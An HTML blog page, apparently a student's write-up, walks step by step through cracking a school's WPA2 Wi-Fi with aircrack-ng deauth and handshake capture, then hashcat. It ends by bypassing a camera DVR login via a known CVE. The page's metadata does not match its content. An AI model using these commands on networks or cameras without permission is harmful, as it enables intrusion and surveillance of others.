@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="theme-color" content="#ffffff">
+    <meta name="keywords" content="automation, AI, nodegraph, netsocket, developer, portfolio, strayfade">
+    <meta name="author" content="Noah Taylor">
+    <meta property="og:site_name" content="strayfade.com">
+    <meta property="og:url" content="strayfade.com">
+    <meta name="twitter:url" content="strayfade.com">
+
+    <meta property="og:title" content="typewriter | strayfade">
+    <meta property="twitter:title" content="typewriter | strayfade">
+    <title>typewriter | strayfade</title>
+    <meta name="description" content="Writing a script to complete my homework">
+    <meta property="og:description" content="Writing a script to complete my homework">
+    <meta property="twitter:description" content="Writing a script to complete my homework">
+
+    <link rel="stylesheet" href="fonts.css">
+    <link rel="stylesheet" href="header.css">
+    <link rel="stylesheet" href="effects.css">
+    <link rel="stylesheet" href="layout.css">
+    <link rel="stylesheet" href="article.css">
+    <script type="text/javascript" src="perlin.js" defer></script>
+    <script type="text/javascript" src="effects.js" defer></script>
+</head>
+
+<body>
+    <header>
+        <div>
+            <span><a href="/">Noah Taylor</a></span>
+            <span class="slash">/</span>
+            <span class="page-title">wpa</span>
+        </div>
+        <div>
+            <a href="/">Back</a>
+        </div>
+    </header>
+    <canvas></canvas>
+    <main>
+        <section id="article">
+            <h3 id="introduction">Introduction</h3>
+            <blockquote>
+                <p><strong>Do not try anything you see done here!</strong> <em>Don&#39;t do as I say <strong>or</strong>
+                        as I do.</em></p>
+                <p>WPA2-PSK &quot;cracking&quot;, &quot;hacking&quot;, or whatever you wish to call this is definitely
+                    not good, and in many cases <strong>illegal</strong>. Make sure you have permission before you mess
+                    with networks that you do not own!</p>
+                <p>In case it is not <strong>very</strong> clear, I had written permission from my high school&#39;s IT
+                    staff to perform this.</p>
+            </blockquote>
+            <h3 id="_why-do-you-want-access-to-the-school-s-internet-anyways-_"><em>Why do you want access to the
+                    school&#39;s internet, anyways?</em></h3>
+            <ol>
+                <li>This network has every nearly every administrative device connected to it. Do I want to mess with
+                    all of that? No. Is it fun to look around and count how many printers a school really needs? Yes.
+                </li>
+                <li>For a kid studying computer security, this has been on the bucket list for quite a while. I&#39;ll
+                    be graduating high school in a year or two, so I might as well enjoy it while I can!</li>
+                <li>If I get lucky, the security camera system will be connected to the same network instead of being
+                    closed-circuit. Watching that would almost be as fun as not doing assignments during class.</li>
+            </ol>
+            <h3 id="how-">How?</h3>
+            <p>Let me introduce you to the <a href="https://www.aircrack-ng.org/">aircrack-ng</a> suite.</p>
+            <p>Aircrack is a collection of command-line tools (such as <code>airmon</code>, <code>airodump</code>,
+                <code>aireplay</code>, and <code>aircrack</code>) that can be used to research and break WPA/WPA2
+                encryption.
+            </p>
+            <p>First, I use the command <code>airmon-ng check kill</code> to kill any processes that may be using the
+                network adapter, since we&#39;ll be needing exclusive access to it. The service
+                <code>avahi-daemon</code> is also using the network card and auto-restarts when killed, so I use
+                <code>systemctl stop avahi-daemon</code> to prevent it from autostarting. Since I&#39;m not disabling
+                the service entirely, it will return when I restart my laptop, so no worries there.
+            </p>
+            <pre><code>root<span class="hljs-variable">@kubuntu</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># systemctl stop avahi-daemon</span>
+
+root<span class="hljs-variable">@kubuntu</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># airmon-ng check kill</span>
+
+Killing these <span class="hljs-symbol">processes:</span>
+
+PID Name
+<span class="hljs-number">940</span> wpa_supplicant
+</code></pre>
+            <p class="image-caption">Yes, root@kubuntu</p>
+
+            <p>With that being done, I can switch the network adapter (identified as <code>wlp1s0</code>) into
+                <strong>monitor mode</strong>. This allows it to pick up (or &quot;sniff&quot;) packets being sent
+                to/from an access point. I can also specify a channel with the <code>-c</code> flag.
+            </p>
+            <pre><code>root@kubuntu:~<span class="hljs-comment"># airmon-ng start wlp1s0</span>
+
+PHY    Interface    Driver        Chipset
+phy0    wlp1s0        rtw_8822ce    00.0 Network controller: Realtek Semiconductor Co., Ltd. RTL8822CE 802.11ac PCIe Wireless Network Adapter
+(mac80211<span class="hljs-built_in"> monitor </span>mode already enabled for [phy0]wlp1s0 on [phy0]10)
+</code></pre>
+            <p>Now, we&#39;re ready to intercept packets.</p>
+            <h3 id="capturing-a-wpa-handshake">Capturing a WPA handshake</h3>
+            <p>To quickly test passwords for an access point (which is kind of important for brute-forcing), I can
+                capture a <strong>handshake</strong> which contains the answer to the one-way hash function that the
+                password is compared with. This allows me to test millions of passwords very quickly by comparing them
+                to the hashed password found in the WPA handshake. From there, it&#39;s just a matter of brute-forcing
+                the hash.</p>
+            <p>But to do all of that, first I need to capture a handshake as it occurs. This can be done using the
+                <code>airodump-ng</code> and <code>aireplay-ng</code> commands from aircrack.
+            </p>
+            <p><strong>airodump-ng</strong> is the main tool responsible for selecting a target network and capturing
+                the handshake. <strong>aireplay-ng</strong> is a tool used to send de-authentication attacks to the
+                access point, which will come into play later.</p>
+            <pre><code>root<span class="hljs-variable">@kubuntu</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># airodump-ng wlp1s0</span>
+</code></pre>
+            <p>Finally, here we have the <strong>airodump CLI</strong>.</p>
+            <pre><code>CH<span class="hljs-number"> 14 </span>][ Elapsed:<span class="hljs-number"> 0 </span>s ][ 2022-11-07 14:31
+
+BSSID              PWR  Beacons    <span class="hljs-comment">#Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID</span>
+
+88:51:00:00:00:00   -1       <span class="hljs-number"> 0 </span>      <span class="hljs-number"> 1 </span>  <span class="hljs-number"> 0 </span> <span class="hljs-number"> 7 </span>  -1   WPA              Students_Wifi
+DA:55:00:00:00:00  -30       <span class="hljs-number"> 2 </span>      <span class="hljs-number"> 0 </span>  <span class="hljs-number"> 0 </span> <span class="hljs-number"> 1 </span><span class="hljs-number"> 360 </span>  WPA2             Admin_Wifi
+</code></pre>
+            <p><em>(These network names are fake, since I&#39;m not just going to give out my school&#39;s name.)</em>
+            </p>
+            <p>This shows all of the access points found in the area, and important information about them such as their
+                <strong>BSSID</strong>, <strong>ESSID</strong>, <strong>channel</strong>, and
+                <strong>encryption</strong> (which is some form of WPA). Airodump will attempt to capture a handshake,
+                which occurs when a device attempts to authenticate with the access point. To narrow our search down to
+                a specific access point, I will select a specific network by its BSSID and channel and only search for
+                it.
+            </p>
+            <pre><code><span class="hljs-selector-tag">root</span>@<span class="hljs-selector-tag">kubuntu</span>:~# <span class="hljs-selector-tag">airodump-ng</span> <span class="hljs-selector-tag">wlp1s0</span> <span class="hljs-selector-tag">--bssid</span> <span class="hljs-selector-tag">88</span><span class="hljs-selector-pseudo">:51</span><span class="hljs-selector-pseudo">:00</span><span class="hljs-selector-pseudo">:00</span><span class="hljs-selector-pseudo">:00</span><span class="hljs-selector-pseudo">:00</span> <span class="hljs-selector-tag">-c</span> <span class="hljs-selector-tag">7</span> <span class="hljs-selector-tag">-w</span> <span class="hljs-selector-tag">OUTPUTFILE</span>
+</code></pre>
+            <p>The <code>-w OUTPUTFILE</code> argument tells airodump to write any captured WPA handshakes to a file
+                named <code>OUTPUTFILE-01.cap</code>.
+                Now, we have this result.</p>
+            <pre><code>CH<span class="hljs-number"> 7 </span>][ Elapsed:<span class="hljs-number"> 0 </span>s ][ 2022-11-07 14:31
+
+BSSID              PWR  Beacons    <span class="hljs-comment">#Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID</span>
+
+88:51:00:00:00:00   -1       <span class="hljs-number"> 0 </span>      <span class="hljs-number"> 1 </span>  <span class="hljs-number"> 0 </span> <span class="hljs-number"> 7 </span>  -1   WPA              Students_Wifi
+</code></pre>
+            <p>Instead of having multiple networks shown, we have filtered the scan down to a single address. This
+                increases our chances of capturing a WPA handshake for this specific network.</p>
+            <p>By default, the WPA handshake will appear in the top-right corner of the CLI once one is found.
+                Here&#39;s an example (notice the handshake next to the timestamp in the top-right corner).</p>
+            <pre><code>CH 7 ][<span class="hljs-string"> Elapsed: 0 s </span>][<span class="hljs-symbol"> 2022-11-07 14:31 </span>] [ WPA handshake: 88:51:00:00:00:00
+
+BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
+
+88:51:00:00:00:00   -1        0        1    0   7   -1   WPA              Students_Wifi
+</code></pre>
+            <p><strong>Wait.</strong> What if we don&#39;t want to or don&#39;t have time to wait for a device to
+                connect to the network and <em>maybe</em> capture a handshake? This is where <code>aireplay-ng</code>
+                comes into play.</p>
+            <h3 id="let-s-talk-about-deauth-attacks">Let&#39;s talk about deauth attacks</h3>
+            <p>To speed up the process of capturing a WPA handshake, we can use a deauth (short for deauthentication)
+                attack. This will trick the access point into rejecting authentication for connected clients, who will
+                then automatically re-connect and give us a handshake to capture. This is done using the
+                <code>aireplay-ng</code> tool.
+            </p>
+            <pre><code><span class="hljs-selector-tag">root</span>@<span class="hljs-selector-tag">kubuntu</span>:~# <span class="hljs-selector-tag">aireplay-ng</span> <span class="hljs-selector-tag">--deauth</span> <span class="hljs-selector-tag">0</span> <span class="hljs-selector-tag">-a</span> <span class="hljs-selector-tag">88</span><span class="hljs-selector-pseudo">:51</span><span class="hljs-selector-pseudo">:00</span><span class="hljs-selector-pseudo">:00</span><span class="hljs-selector-pseudo">:00</span><span class="hljs-selector-pseudo">:00</span> <span class="hljs-selector-tag">wlp1s0</span>
+</code></pre>
+            <p>This will send a <code>--deauth</code> attack to the <code>-a</code>ccess point at BSSID
+                <code>88:51:00:00:00:00</code> on adapter <code>wlp1s0</code>, which looks like this:
+            </p>
+            <pre><code>00<span class="hljs-selector-pseudo">:00</span><span class="hljs-selector-pseudo">:00</span> <span class="hljs-selector-tag">Waiting</span> <span class="hljs-selector-tag">for</span> <span class="hljs-selector-tag">beacon</span> <span class="hljs-selector-tag">frame</span> (<span class="hljs-selector-tag">BSSID</span>: 88<span class="hljs-selector-pseudo">:51</span><span class="hljs-selector-pseudo">:00</span><span class="hljs-selector-pseudo">:00</span><span class="hljs-selector-pseudo">:00</span><span class="hljs-selector-pseudo">:00)</span> <span class="hljs-selector-tag">on</span> <span class="hljs-selector-tag">channel</span> 7
+00<span class="hljs-selector-pseudo">:00</span><span class="hljs-selector-pseudo">:00</span> <span class="hljs-selector-tag">Sending</span> <span class="hljs-selector-tag">DeAuth</span> <span class="hljs-selector-tag">to</span> <span class="hljs-selector-tag">broadcast</span> <span class="hljs-selector-tag">--</span> <span class="hljs-selector-tag">BSSID</span>: <span class="hljs-selector-attr">[88:51:00:00:00:00]</span>
+00<span class="hljs-selector-pseudo">:00</span><span class="hljs-selector-pseudo">:00</span> <span class="hljs-selector-tag">Sending</span> <span class="hljs-selector-tag">DeAuth</span> <span class="hljs-selector-tag">to</span> <span class="hljs-selector-tag">broadcast</span> <span class="hljs-selector-tag">--</span> <span class="hljs-selector-tag">BSSID</span>: <span class="hljs-selector-attr">[88:51:00:00:00:00]</span>
+00<span class="hljs-selector-pseudo">:00</span><span class="hljs-selector-pseudo">:00</span> <span class="hljs-selector-tag">Sending</span> <span class="hljs-selector-tag">DeAuth</span> <span class="hljs-selector-tag">to</span> <span class="hljs-selector-tag">broadcast</span> <span class="hljs-selector-tag">--</span> <span class="hljs-selector-tag">BSSID</span>: <span class="hljs-selector-attr">[88:51:00:00:00:00]</span>
+00<span class="hljs-selector-pseudo">:00</span><span class="hljs-selector-pseudo">:00</span> <span class="hljs-selector-tag">Sending</span> <span class="hljs-selector-tag">DeAuth</span> <span class="hljs-selector-tag">to</span> <span class="hljs-selector-tag">broadcast</span> <span class="hljs-selector-tag">--</span> <span class="hljs-selector-tag">BSSID</span>: <span class="hljs-selector-attr">[88:51:00:00:00:00]</span>
+00<span class="hljs-selector-pseudo">:00</span><span class="hljs-selector-pseudo">:00</span> <span class="hljs-selector-tag">Sending</span> <span class="hljs-selector-tag">DeAuth</span> <span class="hljs-selector-tag">to</span> <span class="hljs-selector-tag">broadcast</span> <span class="hljs-selector-tag">--</span> <span class="hljs-selector-tag">BSSID</span>: <span class="hljs-selector-attr">[88:51:00:00:00:00]</span>
+...
+</code></pre>
+            <p>This should be run at the same time as the original <code>airodump-ng</code> command to capture the
+                handshake. If everything goes smoothly, we&#39;ll have a WPA handshake to test password lists against.
+            </p>
+            <h3 id="cracking-the-password">Cracking the password</h3>
+            <p>To test passwords against the <code>OUTPUTFILE-01.cap</code> file that <code>airodump-ng</code>
+                generated, we use the tool <code>aircrack-ng</code>. For this, we&#39;ll need a password list (I&#39;m
+                using one from <a href="https://github.com/danielmiessler/SecLists">SecLists</a>), and the
+                <code>OUTPUTFILE-01.cap</code> file.
+            </p>
+            <pre><code>root<span class="hljs-variable">@kubuntu</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># aircrack-ng OUTPUTFILE-01.cap -w ./SecLists/Passwords/xato-net-10-million-passwords-1000000.txt</span>
+</code></pre>
+            <p>This starts <code>aircrack-ng</code> and with some luck, our password will be in the list we&#39;re
+                testing.</p>
+            <pre><code>Aircrack-ng 1.7
+
+[00:00:05] 44772/14344393 keys tested (9907.66 k/s)
+
+Time left:<span class="hljs-number"> 24 </span>minutes,<span class="hljs-number"> 3 </span>seconds                           0.31%
+
+Current passphrase: 080385
+
+Master Key:    <span class="hljs-number"> 46 </span>6D E0 EF<span class="hljs-number"> 63 </span>E8 6C E9 C2 CA B1<span class="hljs-number"> 61 </span>F8<span class="hljs-number"> 80 </span>9F 6A
+                3A E4 AD<span class="hljs-number"> 20 </span>5A<span class="hljs-number"> 61 </span>12 D2<span class="hljs-number"> 19 </span>2D 7C F5<span class="hljs-number"> 87 </span>21<span class="hljs-number"> 24 </span>3A
+
+Transient Key:  CF CC<span class="hljs-number"> 76 </span>B1 2C<span class="hljs-number"> 84 </span>A0 A5 8D 6C<span class="hljs-number"> 41 </span>F4<span class="hljs-number"> 81 </span>26 2C 4E
+                FF<span class="hljs-number"> 23 </span>26<span class="hljs-number"> 89 </span>7D 7A<span class="hljs-number"> 26 </span>B8 3C A2<span class="hljs-number"> 33 </span>E5<span class="hljs-number"> 06 </span>15 7B 5C
+                D9<span class="hljs-number"> 49 </span>71 FE<span class="hljs-number"> 34 </span>0F E7 AD<span class="hljs-number"> 46 </span>77 A2 9A<span class="hljs-number"> 14 </span>E7 F2 0C
+                C7<span class="hljs-number"> 36 </span>A7 3B<span class="hljs-number"> 45 </span>EF D0 5E 7C 2E<span class="hljs-number"> 07 </span>11 FD<span class="hljs-number"> 74 </span>CB 3B
+
+EAPOL HMAC:     E9<span class="hljs-number"> 69 </span>68 A2<span class="hljs-number"> 14 </span>B1 1B C8<span class="hljs-number"> 53 </span>6C 6B E5 F8 AD EE 30
+</code></pre>
+            <p>After some time, the correct password will be found!</p>
+            <pre><code><span class="hljs-symbol">Aircrack</span>-ng <span class="hljs-number">1.7</span>
+
+[<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">05</span>] <span class="hljs-number">44772</span>/<span class="hljs-number">14344393</span> keys tested (<span class="hljs-number">9907.66</span> k/s)
+
+<span class="hljs-symbol">Time</span> left: <span class="hljs-number">24</span> minutes, <span class="hljs-number">3</span> seconds                           <span class="hljs-number">0.31</span><span class="hljs-comment">%</span>
+
+<span class="hljs-symbol">KEY</span> <span class="hljs-symbol">FOUND</span>! [ <span class="hljs-symbol">Students</span> ]
+...
+</code></pre>
+            <h3 id="what-if-i-still-can-t-find-the-password-">What if I still can&#39;t find the password?</h3>
+            <p>If the password isn&#39;t in a wordlist somewhere, that means you&#39;re probably trying to crack a
+                password that is at least somewhat decent. This was the case for the <strong>Admin_Wifi</strong> example
+                network that was alongside the Students network above.</p>
+            <p>Let&#39;s talk about a tool called <a href="https://hashcat.net/hashcat/">Hashcat</a>. Hashcat is a
+                hash-cracking program that can be used, in our case, to brute-force WPA2.</p>
+            <p>Hashcat is needed for two very important reasons:</p>
+            <ol>
+                <li>Instead of using a pre-defined wordlist, Hashcat can create a password guess from any number of
+                    random parameters. In this case, we can use <code>?l</code> to represent lowercase ASCII characters,
+                    <code>?u</code> for uppercase ones, and <code>?d</code> for decimal values (numbers). By doing this,
+                    we can create guessing rules (Example: <code>?l?u?d</code> means the password is a lowercase
+                    character, followed by an uppercase character, followed by a single number).
+                </li>
+                <li>Hashcat can run on the GPU (using CUDA in this case) to greatly speed up the process by using
+                    parallelization techniques (also known as &quot;running many, many hashing algorithms at the same
+                    time&quot;).</li>
+            </ol>
+            <blockquote>
+                <p>I brought the <strong><code>OUTPUTFILE-01.cap</code></strong> capture home with me on a USB drive!
+                </p>
+            </blockquote>
+            <p>I converted the WPA handshake that I captured earlier into an <code>hc22000</code> file, which Hashcat
+                accepts. Then, I used the mask <code>?1?1?1?1201?d</code> where <code>?1</code> was a set of all 7-bit
+                ASCII characters. This mask means that the first four characters could be anything, and the last four
+                characters would likely be a year between 2010 and 2019. I figured that I would start at an eight
+                character long password, since that is the minimum length that a WPA2 password can be.</p>
+            <p>The <code>-m 22000</code> argument specifies what type of hash to crack (&quot;22000&quot; for a
+                <code>WPA-PBKDF2-PMKID+EAPOL</code> file), and the <code>-a 3</code> tells Hashcat to attempt a
+                brute-force attack.
+            </p>
+            <p>Here&#39;s the command:</p>
+            <pre><code>hashcat -m <span class="hljs-number">22000</span> WPA.hc22000 <span class="hljs-number">-1</span> ?d?l?u -a <span class="hljs-number">3</span> ?<span class="hljs-number">1</span>?<span class="hljs-number">1</span>?<span class="hljs-number">1</span>?<span class="hljs-number">1</span>?<span class="hljs-number">1</span>?<span class="hljs-number">1</span>?<span class="hljs-number">1</span>?<span class="hljs-number">1</span>
+</code></pre>
+            <p>And, after running for around 3 minutes, I got the result I was looking for.</p>
+            <pre><code>Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: <span class="hljs-number">22000</span> (WPA-PBKDF2-PMKID+EAPOL)
+Hash.Target......: WPA.hc22000
+</code></pre>
+            <p>Finally, the network&#39;s SSID and credentials could be found in the <code>hashcat.potfile</code> file
+                generated by Hashcat.</p>
+            <h3 id="further-control">Further control</h3>
+            <p>After scanning the network for connected devices, I found the IP address of an internet-connected DVR
+                which the cameras recorded to. However, it required authentication and the camera streams could not be
+                viewed without it. By looking at the login page source, I was able to identify the manufacturer of the
+                DVR system — a company by the name of Night Owl.</p>
+            <p>Doing a quick Google search led me to an active vulnerability, <a
+                    href="https://nvd.nist.gov/vuln/detail/CVE-2018-9995">(CVE-2018-9995)</a>, which allowed bypassing
+                the login screen entirely. This vulnerability affected many brands of DVR systems which all ran TBK
+                DVR4104 or DVR4216 firmware.</p>
+            <blockquote>
+                <p>No, I&#39;m not posting even anonymized pictures of my school&#39;s camera feeds here lol</p>
+            </blockquote>
+        </section>
+    </main>
+</body>
+
+</html>
